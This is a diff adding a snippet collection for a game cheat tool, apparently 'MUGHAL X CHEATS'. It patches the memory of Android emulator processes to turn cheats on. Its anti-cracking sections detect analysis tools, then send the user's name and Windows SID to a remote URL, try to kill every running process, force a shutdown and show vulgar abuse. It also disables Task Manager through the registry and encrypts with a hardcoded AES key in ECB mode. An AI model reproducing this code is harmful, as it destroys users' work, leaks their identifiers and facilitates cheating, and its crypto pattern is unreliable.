@@ -1693,3 +1693,793 @@ else
      
      
      
+# Discord RPC
+
+
+    in main form load
+    RPC.rpctimestamp = Timestamps.Now;
+    RPC.InitializeRPC();
+    
+    
+    
+     create a class and name RPC
+    
+    
+    
+    public static DiscordRpcClient client;
+    public static Timestamps rpctimestamp { get; set; }
+    private static RichPresence presence;
+    
+    public static void InitializeRPC()
+    {
+        // Replace "YOUR_DISCORD_APP_ID_HERE" with your actual Discord application ID
+        client = new DiscordRpcClient("1236315776944701550");
+        client.Initialize();
+    
+        // Set up buttons with appropriate URLs
+        DiscordRPC.Button[] buttons = {
+            new DiscordRPC.Button() { Label = "DISCORD", Url = "https://discord.gg/UxH39kjt6m" },
+            new DiscordRPC.Button() { Label = "YOUTUBE", Url = "https://youtu.be/OqLcR4Cb-Oc?si=s-jDgBcgUhkm2R5Q" }
+        };
+    
+        // Set up the initial presence
+        presence = new RichPresence()
+        {
+            Buttons = buttons,
+            Timestamps = rpctimestamp,
+    
+            Assets = new Assets()
+            {
+                LargeImageKey = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExaXhzZnN3YWVza3lwcmpvbnoxaGZoYTBzeXRjdzFyMXI1OWVuaGhmdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/BleFjtX4wxmOfKorRg/giphy.gif",
+                LargeImageText = "MUGHAL X CHEATS",
+                SmallImageKey = "https://media4.giphy.com/media/xmOMPI63SsyZyKz2Tx/giphy.gif?cid=790b7611485d6e9b471bcd8f93609e96f8a02c35a7e05685&rid=giphy.gif&ct=s",
+                SmallImageText = "</> Developer MUGHALXCHEATS"
+            }
+        };
+    
+        client.SetPresence(presence);
+        UpdateDiscordPresence();
+    }
+    
+    public static void SetState(string state, bool watching = false)
+    {
+        if (watching)
+            state = "Looking at " + state;
+    
+        presence.State = state;
+        client.SetPresence(presence);
+    }
+    
+    private static void UpdateDiscordPresence()
+    {
+        // Check if the user is logged in before accessing the username and expiry date
+        if (Form1.KeyAuthApp.user_data != null)
+        {
+            string username = Form1.KeyAuthApp.user_data.username;
+            DateTime expiryDateTime = UnixTimeToDateTime(long.Parse(Form1.KeyAuthApp.user_data.subscriptions[0].expiry));
+    
+            presence.Details = $"Username: {username}";
+            presence.State = $"Expiry Date: {expiryDateTime:yyyy/MM/dd HH:mm}";
+        }
+        else
+        {
+            presence.Details = "USER";
+            presence.State = "Expiry Date";
+        }
+    
+        client.SetPresence(presence);
+    }
+    
+    private static DateTime UnixTimeToDateTime(long unixTime)
+    {
+        DateTime unixStart = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+        return unixStart.AddSeconds(unixTime).ToLocalTime();
+    }
+
+
+
+# Particals
+
+    private const int ParticleCount = 80;
+    private const int DrawCount = 80; // Number of particles to draw
+    private readonly Random _random = new Random();
+    private readonly PointF[] _particlePositions = new PointF[ParticleCount];
+    private readonly PointF[] _particleTargetPositions = new PointF[ParticleCount];
+    private readonly float[] _particleSpeeds = new float[ParticleCount];
+    private readonly float[] _particleSizes = new float[ParticleCount];
+    private readonly float[] _particleRadii = new float[ParticleCount];
+    private readonly float[] _particleRotations = new float[ParticleCount];
+    private readonly PointF[] _vertices = new PointF[3]; // Reuse vertices array
+    
+    
+    
+                DoubleBuffered = true;       
+                InitializeParticles();
+    
+                Timer timer = new Timer
+                {
+                    Interval = 3 // Roughly 60 FPS
+                };
+                timer.Tick += (sender, args) =>
+                {
+                    UpdateParticles();
+                    Invalidate(); // Causes the form to be redrawn
+                };
+                timer.Start();
+    
+    
+    private void InitializeParticles()
+    {
+        Size screenSize = Screen.PrimaryScreen.Bounds.Size;
+        for (int i = 0; i < ParticleCount; i++)
+        {
+            _particlePositions[i] = new PointF(0, 0);
+            _particleTargetPositions[i] = new PointF(_random.Next(screenSize.Width), screenSize.Height * 2);
+            _particleSpeeds[i] = 1 + _random.Next(25);
+            _particleSizes[i] = _random.Next(8);
+            _particleRadii[i] = _random.Next(4);
+            _particleRotations[i] = 0;
+        }
+    }
+    
+    private void UpdateParticles()
+    {
+        Size screenSize = Screen.PrimaryScreen.Bounds.Size;
+        for (int i = 0; i < ParticleCount; i++)
+        {
+            if (_particlePositions[i].X == 0 || _particlePositions[i].Y == 0)
+            {
+                _particlePositions[i] = new PointF(_random.Next(screenSize.Width + 1), 15f);
+                _particleSpeeds[i] = 1 + _random.Next(25);
+                _particleRadii[i] = _random.Next(4);
+                _particleSizes[i] = _random.Next(8);
+                _particleTargetPositions[i] = new PointF(_random.Next(screenSize.Width), screenSize.Height * 2);
+            }
+    
+            float deltaTime = 2.5f / 60; // Assuming 60 FPS
+            _particlePositions[i] = Lerp(_particlePositions[i], _particleTargetPositions[i], deltaTime * (_particleSpeeds[i] / 60));
+            _particleRotations[i] += deltaTime;
+    
+            if (_particlePositions[i].Y > screenSize.Height)
+            {
+                _particlePositions[i] = new PointF(0, 0);
+                _particleRotations[i] = 0;
+            }
+        }
+    }
+    
+    private PointF Lerp(PointF start, PointF end, float t)
+    {
+        return new PointF(start.X + (end.X - start.X) * t, start.Y + (end.Y - start.Y) * t);
+    }
+    
+    protected override void OnPaint(PaintEventArgs e)
+    {
+        base.OnPaint(e);
+    
+        e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
+    
+        for (int i = 0; i < DrawCount; i++)
+        {
+            DrawTriangleWithGlow(e.Graphics, _particlePositions[i], _particleSizes[i], _particleRotations[i]);
+        }
+    }
+    
+    private void DrawTriangleWithGlow(Graphics graphics, PointF position, float size, float rotation)
+    {
+        float angle = (float)(Math.PI * 2 / 3); // 120 degrees for equilateral triangle
+        PointF[] vertices = new PointF[3];
+    
+        for (int i = 0; i < 3; i++)
+        {
+            vertices[i] = new PointF(
+                position.X + size * (float)Math.Cos(rotation + i * angle),
+                position.Y + size * (float)Math.Sin(rotation + i * angle)
+            );
+        }
+    
+        graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
+    
+        // Draw glow effect
+        int maxGlowLayers = 10;
+        for (int j = 0; j < maxGlowLayers; j++)
+        {
+            int alpha = 25 - 2 * j; // Gradually decrease alpha for each layer
+            using (Brush glowBrush = new SolidBrush(Color.FromArgb(alpha, 160, 32, 240))) // Semi-transparent red
+            {
+                float glowSize = size + j * 4; // Gradually increase the glow size
+                graphics.FillEllipse(glowBrush, position.X - glowSize / 2, position.Y - glowSize / 2, glowSize, glowSize);
+            }
+        }
+    
+        // Draw triangle
+        using (Brush brush = new SolidBrush(Color.FromArgb(160, 32, 240))) // Solid red color for the triangle
+        {
+            graphics.FillPolygon(brush, vertices);
+        }
+    }
+    public class Particle
+    {
+        public PointF Position { get; set; }
+        public PointF Velocity { get; set; }
+        public int Radius { get; set; }
+        public Color Color { get; set; }
+    
+    }
+    
+    add a timer 
+    
+    UpdateParticles();
+    Invalidate();
+
+
+
+ # Safe Panel From Cracking
+
+     private bool iscrackerapruning11(string processName)
+    {
+        Process[] processes = Process.GetProcessesByName(processName);
+        return processes.Length > 0;
+    }
+            private async void SendMessage(string title, string message)
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    var values = new Dictionary<string, string>
+    {
+                  { "title", title },
+                  { "message", message }
+    };
+    
+                    var content = new FormUrlEncodedContent(values);
+    
+                    try
+                    {
+                        var response = await client.PostAsync("https://discord.gg/PP8ahd2R", content);
+                        var responseString = await response.Content.ReadAsStringAsync();
+                        MessageBox.Show("Message sent: " + responseString);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("Failed to send message: " + ex.Message);
+                    }
+                }
+            }
+    
+    ADD A TIMER AND NAME timernocrack
+    
+    bool iscrackerapruning = iscrackerapruning11("ProcessHacker");
+    bool iscrackerapruning1 = iscrackerapruning11("Procx64");
+    bool iscrackerapruning2 = iscrackerapruning11("x64dbg");
+    bool iscrackerapruning3 = iscrackerapruning11("Cheat Engine");
+    bool iscrackerapruning4 = iscrackerapruning11("CheatEngine-x86_64-SSE4-AVX2");
+    bool iscrackerapruning5 = iscrackerapruning11("dnspy");
+    bool iscrackerapruning6 = iscrackerapruning11("cheatengine-i386");
+    bool iscrackerapruning7 = iscrackerapruning11("cheatengine-x86_64");
+    bool iscrackerapruning8 = iscrackerapruning11("Clean Engine");
+    bool iscrackerapruning9 = iscrackerapruning11("CleanEngine-x86_64-SSE4-AVX2");
+    bool iscrackerapruning0 = iscrackerapruning11("cleanengine-i386");
+    bool iscrackerapruning01 = iscrackerapruning11("cleanengine-x86_64");
+    bool iscrackerapruning02 = iscrackerapruning11("ollydbg.exe");
+    bool iscrackerapruning03 = iscrackerapruning11("ImmunityDebugger.exe");
+    bool iscrackerapruning04 = iscrackerapruning11("Wireshark.exe");
+    bool iscrackerapruning05 = iscrackerapruning11("Fiddler.exe");
+    bool iscrackerapruning06 = iscrackerapruning11("IDA64.exe");
+    bool iscrackerapruning07 = iscrackerapruning11("ReClass.NET.exe");
+    
+    if (iscrackerapruning || iscrackerapruning1 || iscrackerapruning2 || iscrackerapruning3 || iscrackerapruning4 || iscrackerapruning5 || iscrackerapruning6 || iscrackerapruning7 || iscrackerapruning8 || iscrackerapruning9 || iscrackerapruning0 || iscrackerapruning01 || iscrackerapruning02 || iscrackerapruning03 || iscrackerapruning04 || iscrackerapruning05 || iscrackerapruning06 || iscrackerapruning07)
+    {
+        MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
+    
+        SendMessage("Cracker Information", "'''pc name : " + Environment.UserName + "'''\n ''' HWID : " + WindowsIdentity.GetCurrent().User.Value + "'''");
+        Process[] processes = Process.GetProcesses();
+        MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+        Application.Exit();
+    
+        foreach (Process process in processes)
+        {
+            try
+            {
+                process.Kill();
+                MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+                Application.Exit();
+            }
+            catch (Exception)
+            {
+                Process.Start("shutdown", "/s /t 0");
+                MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+                Application.Exit();
+            }
+        }
+    }
+    
+    ADD ANOTHER TIMER AND NAME shutdownTimer
+
+
+
+
+# DLL CONNECTING METHOD
+
+    ----------------Partal Class Form:---------------
+    
+    private System.Timers.Timer Proctimer;
+    
+    
+    -----------public initialize-------------
+    
+      GetProcID(1);
+      Proctimer = new System.Timers.Timer();
+      Proctimer.Interval = 15000;
+      Proctimer.Elapsed += findproc;
+      Proctimer.AutoReset = true;
+    
+    //Timer Starter.................
+    
+    
+    ------------Connecting Dll System---------------------------
+    
+     [DllImport("user32.dll")]
+    public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);
+    [DllImport("KERNEL32.DLL")]
+    public static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processid);
+    [DllImport("KERNEL32.DLL")]
+    public static extern int Process32First(IntPtr handle, ref ProcessEntry32 pe);
+    [DllImport("KERNEL32.DLL")]
+    public static extern int Process32Next(IntPtr handle, ref ProcessEntry32 pe);
+    private static string info;
+    #region Change Mem
+    public static async Task ChangeMem(string original, string replace, string mode)
+    {
+        info = "0";
+        if (PID == null || Convert.ToInt32(PID) == 0)
+        {
+            info = "1";
+            return;
+        }
+    
+        IEnumerable<long> scanmem;
+        try
+        {
+            MemLib.OpenProcess(Convert.ToInt32(PID));
+            scanmem = await MemLib.AoBScan(0L, 140737488355327L, original, true, true);
+        }
+        catch
+        {
+            info = "4";
+            return;
+        }
+    
+        if (scanmem.Count() == 0)
+        {
+            info = "3";
+            return;
+        }
+    
+        Parallel.ForEach(scanmem, num =>
+        {
+            MemLib.OpenProcess(Convert.ToInt32(PID));
+            MemLib.ChangeProtection(num.ToString("X"), MemMughal.MemoryProtection.ReadWrite, out MemMughal.MemoryProtection _);
+            MemLib.WriteMemory(num.ToString("X"), "bytes", replace);
+        });
+    
+        if (mode == "1")
+        {
+            info = "2";
+        }
+        else if (mode == "0")
+        {
+            info = "-2";
+        }
+    }
+    #endregion
+    public static MemMughal MemLib = new MemMughal();
+    private async void findproc(Object source, System.Timers.ElapsedEventArgs e)
+    {
+        if (Convert.ToInt32(PID) == 0)
+        {
+            hook.Text = "Hook : PID - False {" + PID + "}";
+            GetProcID(1);
+        }
+        else
+        {
+            hook.Text = "Hook : PID - True {" + PID + "}";
+        }
+        GetProcID(1);
+    }
+    
+    public static string PID;
+    public static string GetProcID(int index)
+    {
+        string result = "";
+        checked
+        {
+            if (index == 1 || index == 0)
+            {
+                IntPtr intPtr = IntPtr.Zero;
+                uint num = 0U;
+                IntPtr intPtr2 = CreateToolhelp32Snapshot(2U, 0U);
+                if ((int)intPtr2 > 0)
+                {
+                    ProcessEntry32 processEntry = default(ProcessEntry32);
+                    processEntry.dwSize = (uint)Marshal.SizeOf<ProcessEntry32>(processEntry);
+                    for (int num2 = Process32First(intPtr2, ref processEntry); num2 == 1; num2 = Process32Next(intPtr2, ref processEntry))
+                    {
+                        IntPtr intPtr3 = Marshal.AllocHGlobal((int)processEntry.dwSize);
+                        Marshal.StructureToPtr<ProcessEntry32>(processEntry, intPtr3, true);
+                        object obj = Marshal.PtrToStructure(intPtr3, typeof(ProcessEntry32));
+                        ProcessEntry32 processEntry2 = (obj != null) ? ((ProcessEntry32)obj) : default(ProcessEntry32);
+                        Marshal.FreeHGlobal(intPtr3);
+    
+                        if (processEntry2.szExeFile.Contains("HD-Player") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+                        if (processEntry2.szExeFile.Contains("HD-Player.exe") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+                        if (processEntry2.szExeFile.Contains("AndroidProcess") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+    
+                        if (processEntry2.szExeFile.Contains("LdVBoxHeadless") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+    
+                        if (processEntry2.szExeFile.Contains("MEmuHeadless") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+    
+                        if (processEntry2.szExeFile.Contains("NoxVMHandle") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+    
+                        if (processEntry2.szExeFile.Contains("aow_exe") && processEntry2.cntThreads > num)
+                        {
+                            num = processEntry2.cntThreads;
+                            intPtr = (IntPtr)((long)(unchecked((ulong)processEntry2.th32ProcessID)));
+                        }
+                    }
+                }
+                result = Convert.ToString(intPtr);
+                PID = Convert.ToString(intPtr);
+            }
+            return result;
+        }
+    }
+    public struct ProcessEntry32
+    {
+        public uint dwSize;
+        public uint cntUsage;
+        public uint th32ProcessID;
+        public IntPtr th32DefaultHealabel1;
+        public uint th32ModuleID;
+        public uint cntThreads;
+        public uint th32ParentProcessID;
+        public int pcPriClassBase;
+        public uint dwFlags;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+        public string szExeFile;
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    -----------------Timer Connecting--------------
+    
+                if (info == "0")
+                {
+                    status.ForeColor = Color.YellowGreen;
+                    status.Text = "Wait For Apply";
+                }
+                else if (info == "1")
+                {
+                    status.ForeColor = Color.Red;
+                    status.Text = "No Emulator Found";
+                }
+                else if (info == "-2")
+                {
+                    status.Text = "YOUR HACK DEACTIVE!";
+                }
+                else if (info == "2")
+                {
+                    status.Text = "YOUR HACK ACTIVE!";
+                }
+                else if (info == "3")
+                {
+                    status.Text = "Maybe Already Applied Or Nothing Found";
+                }
+                else if (info == "4")
+                {
+                    status.Text = "Wrong PID Please Refresh";
+                }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    --------------------fORM load------------
+    
+       Proctimer.Enabled = true;
+
+
+
+# SAFE PANEL FROM CRACKING V2
+
+
+     public partial class Form1 : Form
+    {
+    
+    
+    
+    private string[] forbiddenProcesses = new string[52]
+    {
+       "ollydbg.exe",
+       "ProcessHacker.exe",
+       "Dump-Fixer.exe",
+       "kdstinker.exe",
+       "tcpview.exe",
+       "autoruns.exe",
+       "autorunsc.exe",
+       "filemon.exe",
+       "procmon.exe",
+       "regmon.exe",
+       "procexp.exe",
+       "ImmunityDebugger.exe",
+       "Wireshark.exe",
+       "dumpcap.exe",
+       "HookExplorer.exe",
+       "ImportREC.exe",
+       "PETools.exe",
+       "LordPE.exe",
+       "SysInspector.exe",
+       "proc_analyzer.exe",
+       "sysAnalyzer.exe",
+       "sniff_hit.exe",
+       "windbg.exe",
+       "joeboxcontrol.exe",
+       "Fiddler.exe",
+       "joeboxserver.exe",
+       "ida64.exe",
+       "ida.exe",
+       "idaq64.exe",
+       "Vmtoolsd.exe",
+       "Vmwaretrat.exe",
+       "Vmwareuser.exe",
+       "Vmacthlp.exe",
+       "vboxservice.exe",
+       "vboxtray.exe",
+       "ReClass.NET.exe",
+       "x64dbg.exe",
+       "OLLYDBG.exe",
+       "Cheat Engine.exe",
+       "cheatengine-x86_64-SSE4-AVX2.exe",
+       "MugenJinFuu-i386.exe",
+       "Mugen JinFuu.exe",
+       "MugenJinFuu-x86_64-SSE4-AVX2.exe",
+       "MugenJinFuu-x86_64.exe",
+       "KsDumper.exe",
+       "dnSpy.exe",
+       "cheatengine-i386.exe",
+       "cheatengine-x86_64.exe",
+       "Fiddler Everywhere.exe",
+       "HTTPDebuggerSvc.exe",
+       "Fiddler.WebUi.exe",
+       "createdump.exe"
+    };
+         private System.Windows.Forms.Timer checkProcessTimer;
+         // 🔥 Windows API to Check Debugger
+         [DllImport("kernel32.dll")]
+         static extern bool IsDebuggerPresent();
+        
+    
+    
+    
+     public Form1()
+     {
+    
+     PreventDebugging();
+     CheckAndKillForbiddenProcesses();
+     DisableTaskManager();
+    
+    
+    
+    
+    
+    
+    
+    private void PreventDebugging()
+    {
+        if (Debugger.IsAttached || IsDebuggerPresent())
+        {
+            MessageBox.Show("Debugging is not allowed!", "Security Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            Application.Exit();
+        }
+    }
+    
+    // 🚀 Method 3: Disable Task Manager
+    private void DisableTaskManager()
+    {
+        try
+        {
+            RegistryKey regKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            regKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+            regKey.Close();
+        }
+        catch (Exception ex)
+        {
+            MessageBox.Show("Error Disabling Task Manager: " + ex.Message);
+        }
+    }
+    
+    // 🚀 Method 4: Encrypt & Decrypt Strings
+    public class Security
+    {
+        private static string key = "MySecretKey12345";
+    
+        public static string Encrypt(string plainText)
+        {
+            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = keyBytes;
+                aes.Mode = CipherMode.ECB;
+                aes.Padding = PaddingMode.PKCS7;
+    
+                using (ICryptoTransform encryptor = aes.CreateEncryptor())
+                {
+                    byte[] inputBytes = Encoding.UTF8.GetBytes(plainText);
+                    byte[] outputBytes = encryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length);
+                    return Convert.ToBase64String(outputBytes);
+                }
+            }
+        }
+    
+        public static string Decrypt(string encryptedText)
+        {
+            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = keyBytes;
+                aes.Mode = CipherMode.ECB;
+                aes.Padding = PaddingMode.PKCS7;
+    
+                using (ICryptoTransform decryptor = aes.CreateDecryptor())
+                {
+                    byte[] inputBytes = Convert.FromBase64String(encryptedText);
+                    byte[] outputBytes = decryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length);
+                    return Encoding.UTF8.GetString(outputBytes);
+                }
+            }
+        }
+    }
+    
+    // 🛑 Enable Task Manager When Application Closes
+    private void LoginForm_FormClosing(object sender, FormClosingEventArgs e)
+    {
+        EnableTaskManager();
+    }
+    
+    private void EnableTaskManager()
+    {
+        try
+        {
+            RegistryKey regKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            regKey.DeleteValue("DisableTaskMgr", false);
+            regKey.Close();
+        }
+        catch { }
+    }
+    
+    
+    
+    
+    private bool iscrackerapruning11(string processName)
+    {
+        Process[] processes = Process.GetProcessesByName(processName);
+        return processes.Length > 0;
+    }
+            private async void SendMessage(string title, string message)
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    var values = new Dictionary<string, string>
+    {
+                  { "title", title },
+                  { "message", message }
+    };
+    
+                    var content = new FormUrlEncodedContent(values);
+    
+                    try
+                    {
+                        var response = await client.PostAsync("https://discord.gg/PP8ahd2R", content);
+                        var responseString = await response.Content.ReadAsStringAsync();
+                        MessageBox.Show("Message sent: " + responseString);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("Failed to send message: " + ex.Message);
+                    }
+                }
+            }
+    
+    
+    
+    
+    
+    ADD A TIMER AND NAME timernocrack
+    
+    bool iscrackerapruning = iscrackerapruning11("ProcessHacker");
+    bool iscrackerapruning1 = iscrackerapruning11("Procx64");
+    bool iscrackerapruning2 = iscrackerapruning11("x64dbg");
+    bool iscrackerapruning3 = iscrackerapruning11("Cheat Engine");
+    bool iscrackerapruning4 = iscrackerapruning11("CheatEngine-x86_64-SSE4-AVX2");
+    bool iscrackerapruning5 = iscrackerapruning11("dnspy");
+    bool iscrackerapruning6 = iscrackerapruning11("cheatengine-i386");
+    bool iscrackerapruning7 = iscrackerapruning11("cheatengine-x86_64");
+    bool iscrackerapruning8 = iscrackerapruning11("Clean Engine");
+    bool iscrackerapruning9 = iscrackerapruning11("CleanEngine-x86_64-SSE4-AVX2");
+    bool iscrackerapruning0 = iscrackerapruning11("cleanengine-i386");
+    bool iscrackerapruning01 = iscrackerapruning11("cleanengine-x86_64");
+    bool iscrackerapruning02 = iscrackerapruning11("ollydbg.exe");
+    bool iscrackerapruning03 = iscrackerapruning11("ImmunityDebugger.exe");
+    bool iscrackerapruning04 = iscrackerapruning11("Wireshark.exe");
+    bool iscrackerapruning05 = iscrackerapruning11("Fiddler.exe");
+    bool iscrackerapruning06 = iscrackerapruning11("IDA64.exe");
+    bool iscrackerapruning07 = iscrackerapruning11("ReClass.NET.exe");
+    
+    if (iscrackerapruning || iscrackerapruning1 || iscrackerapruning2 || iscrackerapruning3 || iscrackerapruning4 || iscrackerapruning5 || iscrackerapruning6 || iscrackerapruning7 || iscrackerapruning8 || iscrackerapruning9 || iscrackerapruning0 || iscrackerapruning01 || iscrackerapruning02 || iscrackerapruning03 || iscrackerapruning04 || iscrackerapruning05 || iscrackerapruning06 || iscrackerapruning07)
+    {
+        MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
+    
+        SendMessage("Cracker Information", "'''pc name : " + Environment.UserName + "'''\n ''' HWID : " + WindowsIdentity.GetCurrent().User.Value + "'''");
+        Process[] processes = Process.GetProcesses();
+        MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+        Application.Exit();
+    
+        foreach (Process process in processes)
+        {
+            try
+            {
+                process.Kill();
+                MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+                Application.Exit();
+            }
+            catch (Exception)
+            {
+                Process.Start("shutdown", "/s /t 0");
+                MessageBox.Show("I Fuck Your Sister's Pussy So Hard Cracker");
+                Application.Exit();
+            }
+        }
+    }
+
+
+
+
+
+
+
+
+
+
